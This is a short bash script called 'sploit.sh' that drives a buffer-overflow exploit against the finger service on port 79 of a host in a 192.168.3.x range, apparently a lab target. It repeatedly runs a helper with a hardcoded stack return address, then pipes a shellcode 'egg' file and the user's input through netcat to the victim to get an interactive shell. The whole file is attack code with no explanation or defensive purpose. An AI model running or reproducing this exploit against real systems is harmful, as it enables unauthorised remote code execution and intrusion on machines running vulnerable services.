#!/bin/bash
IP="192.168.3."
trap ctrl_c INT

function ctrl_c() {
        exit 0
}

if [[ $1 == "-h" ]]; then
  echo "Usage: sploit.sh <victim #> <egg>"
fi

max=10000

for (( i=0; i<=$max; i+=1 )); do
  ./ovf32 167 12 0xbffffa08 0
  echo >> overflow
  cat $2 - | nc $IP$1 79
  sleep .1
done;
